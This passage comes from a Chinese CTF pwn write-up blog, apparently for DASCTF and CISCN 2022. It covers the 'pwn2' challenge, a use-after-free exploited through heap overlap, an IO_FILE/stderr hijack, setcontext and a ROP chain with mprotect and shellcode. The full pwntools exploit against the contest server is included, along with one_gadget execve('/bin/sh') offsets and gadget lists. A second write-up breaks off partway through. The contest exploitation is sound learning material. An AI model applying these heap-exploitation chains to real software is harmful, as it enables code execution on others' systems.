NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe534f execve(&quot;/bin/sh&quot;, r13, rbx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [rbx] == NULL || rbx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe54f7 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe54fe execve(&quot;/bin/sh&quot;, rcx, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rcx] == NULL || rcx == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe5502 execve(&quot;/bin/sh&quot;, rcx, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rcx] == NULL || rcx == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a308 execve(&quot;/bin/sh&quot;, rsi, [rax])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [[rax]] == NULL || [rax] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>ones = [libc_base + <span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;\n(.+?) execve&#x27;</span>,og)] + [libc_base + <span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;\n(.+?) posix_spawn&#x27;</span>,og)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ones)):<br>    lg(<span class="hljs-string">&#x27;ONES[%d]&#x27;</span>%i,ones[i])<br><span class="hljs-comment"># add(0x50,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=(&#x27;CC&#123;&#125;&#x27;.format(1)).ljust(8,&#x27;\0&#x27;)+(&#x27;SW&#123;&#125;&#x27;.format(2)).ljust(8,&#x27;\0&#x27;)+(&#x27;AD&#123;&#125;&#x27;.format(2)).ljust(8,&#x27;\0&#x27;)+str(p8((3))).ljust(4,&#x27;\0&#x27;)+p8(13).ljust(8,&#x27;\0&#x27;))</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=p64(ones[<span class="hljs-number">1</span>]),name=(<span class="hljs-string">&#x27;FF&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">9</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><br><br><br><span class="hljs-comment"># add(0x100,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=&#x27;FK3&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;NM3&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;ND3&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;\x05&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;\x06&#x27;.ljust(8,&#x27;\0&#x27;))</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn2"><a class="header-anchor" href="#pwn2">¶</a>pwn2</h2><p>一血题</p><p>这题的漏洞也很直接，就是一个 UAF，关键在堆风水和利用。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731231941452.png" alt="pwn2-1"></p><p>但是每次 calloc 会清空堆块内容，leak libc 只能依赖 free 时的内容显示。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731232057742.png" alt="pwn2-2"></p><p>后门函数，一次写固定值，一次任意写。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731232342257.png" alt="pwn2-3"></p><h3 id="具体思路"><a class="header-anchor" href="#具体思路">¶</a>具体思路</h3><ol><li>利用 UAF 构造 fastbin double free，leak 堆地址的同时去构造堆块重叠</li><li>分割 Largebin 至 tcache 范围内，避免再次 free 报错，利用 Offer by one 这个一次性函数填补 <code>\x00</code> 后 free，leak 出libc。</li><li>这样我们很轻易的可以控制 servant，进入后门函数</li><li>后门函数我采取的思路是不管固定值的这个，劫持 stderr 为堆地址，perror 进入 __vxprintf 触发 IO 流</li><li>IO 流构造比较复杂，也是采取的调试改风水的思路，控制 <code>_wide_data</code> 结构体，setcontext 配合 gets 完成 shellcode 利用</li><li>详见 exp</li></ol><h3 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b *_IO_wdoallocbuf\n&#x27;</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn2&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;tcp.dasc.buuoj.cn&#x27;</span>,<span class="hljs-number">23606</span>)<br><br>sla(<span class="hljs-string">&quot;Your name: &quot;</span>,<span class="hljs-string">&#x27;u&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mage</span>(<span class="hljs-params">trick</span>):<br>    menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;What&#x27;s your trick?&quot;</span>,<span class="hljs-built_in">str</span>(trick))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">servant</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name,info</span>):<br>    menu(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Recruit Servant for which Mage?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&quot;Servant name: &quot;</span>,<span class="hljs-built_in">str</span>(name))<br>    sla(<span class="hljs-string">&quot;Servant info: &quot;</span>,<span class="hljs-built_in">str</span>(info))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,magic=<span class="hljs-string">&#x27;n&#x27;</span></span>):<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Which Mage?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Offer by one?&#x27;</span>,magic)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Which Mage?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    <span class="hljs-comment"># if magic == &#x27;y&#x27;:</span><br>    <span class="hljs-comment">#     se(&#x27;u&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">mage=<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-built_in">chr</span>=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Would you like to select a Mage to attack ?&quot;</span>,mage)<br>    <span class="hljs-keyword">if</span> mage == <span class="hljs-string">&#x27;y&#x27;</span>:<br>        sla(<span class="hljs-string">&quot;Which Mage ?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><br>mage(<span class="hljs-string">&quot;fuck0&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(<span class="hljs-number">0x51</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">8</span>)<br>servant(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;nmsl&#x27;</span>,<span class="hljs-string">&#x27;wsnd&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x11</span>):<br>    mage(<span class="hljs-string">&quot;fuck&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    attack(<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-i)<br><br>attack(<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Expel Mage, whose trick is: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">5</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>mage(p64(heap_leak^(heap_base+<span class="hljs-number">0x2b0</span>))) <span class="hljs-comment"># 0x11</span><br>mage(<span class="hljs-string">&#x27;fuckx12&#x27;</span>) <span class="hljs-comment"># 0x12</span><br>mage(<span class="hljs-string">&#x27;fuckx13&#x27;</span>) <span class="hljs-comment"># 0x13</span><br><br>dele(<span class="hljs-number">0</span>)<br>mage(<span class="hljs-string">&quot;fuckx14&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(<span class="hljs-number">0x51</span>)+p64(heap_leak)) <span class="hljs-comment"># 0x14</span><br><br><br>menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sea(<span class="hljs-string">&quot;What&#x27;s your trick?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;\x01&#x27;</span>*<span class="hljs-number">0x28</span>+p32(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">3</span>)) <span class="hljs-comment"># 0x15</span><br><br><span class="hljs-comment"># attack(&#x27;n&#x27;,&#x27;1&#x27;)</span><br>dele(<span class="hljs-number">0x14</span>)<br>mage(<span class="hljs-string">&quot;fuckx16&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(<span class="hljs-number">0x461</span>)+p64(heap_leak)) <span class="hljs-comment"># 0x16</span><br><span class="hljs-comment"># attack(&#x27;y&#x27;,0xf)</span><br><br>dele(<span class="hljs-number">0x15</span>)<br><br>mage(<span class="hljs-string">&quot;fuckx17&quot;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p32(<span class="hljs-number">0x7fffff01</span>)+p32(<span class="hljs-number">0x123456</span>)+p64(heap_base+<span class="hljs-number">0x2c0</span>)) <span class="hljs-comment"># 0x17</span><br><br>dele(<span class="hljs-number">0x1</span>,<span class="hljs-string">&#x27;y&#x27;</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c0a</span>    <br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x1e1f60</span><br>stderr = libc_base + <span class="hljs-number">0x1e17a0</span><br><span class="hljs-comment">#  x/20xg 0x555555606600</span><br>delete(<span class="hljs-number">0xa</span>)<br>mage((<span class="hljs-string">&quot;fuckx18\0&quot;</span>+p64(heap_base+<span class="hljs-number">0x200</span>)).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p64(heap_base+<span class="hljs-number">0x690</span>)) <span class="hljs-comment"># 0x18</span><br>delete(<span class="hljs-number">0xb</span>)<br>mage(p64(<span class="hljs-number">0</span>)+p64(_IO_wfile_jumps-<span class="hljs-number">0x20</span>)) <span class="hljs-comment"># 0x19</span><br>rdi = <span class="hljs-number">0x0000000000028a55</span> + libc_base<br>ret = <span class="hljs-number">0x0000000000026699</span> + libc_base<br>rsi = <span class="hljs-number">0x000000000002a4cf</span> + libc_base<br>rdx = <span class="hljs-number">0x00000000000c7f32</span> + libc_base<br>delete(<span class="hljs-number">0xd</span>)<br>mage(p64(rdi)+p64(heap_base+<span class="hljs-number">0x6d0</span>)+p64(libc.sym.gets)) <span class="hljs-comment"># 0x19</span><br><br><br>delete(<span class="hljs-number">0xe</span>)<br>mage(p64(<span class="hljs-number">0</span>)+p64(libc.sym.gets)+p64(heap_base+<span class="hljs-number">0x6d0</span>)+p64(ret)) <span class="hljs-comment"># 0x19</span><br>delete(<span class="hljs-number">0xf</span>)<br>mage(p64(heap_base+<span class="hljs-number">0x778</span>-<span class="hljs-number">0x68</span>)+p64(magic)) <span class="hljs-comment"># 0x19</span><br><br>menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>sea(<span class="hljs-string">&#x27;LEAVE MY NAME: &#x27;</span>,p64(heap_base+<span class="hljs-number">0x100</span>))<br>sea(<span class="hljs-string">&#x27;WRITE YOUR NAME: &#x27;</span>,p64(stderr))<br><span class="hljs-comment"># pause()</span><br>se(p64(heap_base+<span class="hljs-number">0x600</span>-<span class="hljs-number">0xa0</span>))<br><br>rop_chain = p64(heap_base+<span class="hljs-number">0x300</span>)<br>rop_chain += <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span><br>rop_chain += p64(rdi) + p64(heap_base) + p64(rsi) + p64(<span class="hljs-number">0x2000</span>) + p64(rdx) + p64(<span class="hljs-number">7</span>) + p64(libc.sym.mprotect) + p64(heap_base+<span class="hljs-number">0x728</span>)<br>rop_chain += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)+shellcraft.exit(<span class="hljs-number">0</span>))<br>sleep(<span class="hljs-number">3</span>)<br>sl(rop_chain)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> 0x7ffff7e30d91 &lt;perror_internal+81&gt;     lea    rsi, [rip + 0x14f54f]</span><br><span class="hljs-string">   0x7ffff7e30d98 &lt;perror_internal+88&gt;     xor    eax, eax</span><br><span class="hljs-string"> ► 0x7ffff7e30d9a &lt;perror_internal+90&gt;     call   __fxprintf                &lt;__fxprintf&gt;</span><br><span class="hljs-string">        rdi: 0x555555606560 ◂— 0x0</span><br><span class="hljs-string">        rsi: 0x7ffff7f802e7 ◂— 0xa732573257325 /* &#x27;%s%s%s\n&#x27; */</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"> 0x7ffff7e453f6 &lt;__vfprintf_internal+262&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="hljs-string">   0x7ffff7e453fb &lt;__vfprintf_internal+267&gt;    mov    rdx, rbx</span><br><span class="hljs-string">   0x7ffff7e453fe &lt;__vfprintf_internal+270&gt;    mov    rdi, rbp</span><br><span class="hljs-string"> ► 0x7ffff7e45401 &lt;__vfprintf_internal+273&gt;    call   qword ptr [r12 + 0x38]        &lt;_IO_wfile_xsputn&gt;</span><br><span class="hljs-string">        rdi: 0x555555606560 ◂— 0x0</span><br><span class="hljs-string">        rsi: 0x7ffff7f802e7 ◂— 0xa732573257325 /* &#x27;%s%s%s\n&#x27; */</span><br><span class="hljs-string">        rdx: 0x0</span><br><span class="hljs-string">        rcx: 0xd68</span><br><span class="hljs-string"> 0x7ffff7e54a52 &lt;_IO_wdoallocbuf+34&gt;    jne    _IO_wdoallocbuf+152                &lt;_IO_wdoallocbuf+152&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e54a54 &lt;_IO_wdoallocbuf+36&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="hljs-string"> ► 0x7ffff7e54a5b &lt;_IO_wdoallocbuf+43&gt;    call   qword ptr [rax + 0x68]</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e54a5e &lt;_IO_wdoallocbuf+46&gt;    cmp    eax, -1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">0x0000000000028a55 : pop rdi ; ret</span><br><span class="hljs-string">0x0000000000112a51 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000c7f32 : pop rdx ; ret</span><br><span class="hljs-string">0x0000000000095982 : pop rdx ; ret 0x11</span><br><span class="hljs-string">0x0000000000093342 : pop rdx ; ret 0xfffc</span><br><span class="hljs-string">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cf : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="hljs-string">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-string">0x000000000002a04c : pop rsp ; pop r13 ; ret</span><br><span class="hljs-string">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000033af2 : pop rsp ; ret</span><br><span class="hljs-string">0x0000000000026699 : ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># dele(0xf)</span><br><br><span class="hljs-comment"># menu(5)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2022 华东北赛区 Pwn Writeup</title>
    <link href="/posts/2c3848ae.html"/>
    <url>/posts/2c3848ae.html</url>
    
    <content type="html"><![CDATA[<p>Pwn 难度不大，草草地ak了，最后也是擦边进了决赛，还是比较有惊无险的。<s>但是👴大雾好像要🐔了，👴下去好好反思反思。</s>（然而没有）另外这小可爱比赛Pwn全做了算上前三的加成👴也就1200+30+30+60，感觉不如隔壁取证一题1200+360。</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220624170308020.png" alt="image-20220624170308020" style="zoom: 50%;" /><h2 id="duck"><a class="header-anchor" href="#duck">¶</a>duck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194732802.png" alt="image-20220619194732802"></p><p><strong>flag{693edf4763ef4cdd4f152794028b7f5e}</strong></p><p>libc 2.34 下的 pwn 题，给的漏洞比较基础就是 <strong>UAF</strong>，同时给了 Edit 功能，我们可以很简单的 getshell。</p><p><strong>思路</strong></p><ol><li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li><li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li><li>修改掉 stderr 的 flag 为 <code>/bin/sh\0</code></li><li>修改掉 <code>_IO_file_jumps</code> 里的函数指针为 <code>system</code> ，最后改掉 Top Chunk 的 size 进入 <code>_IO_fflush</code> 触发 getshell。</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 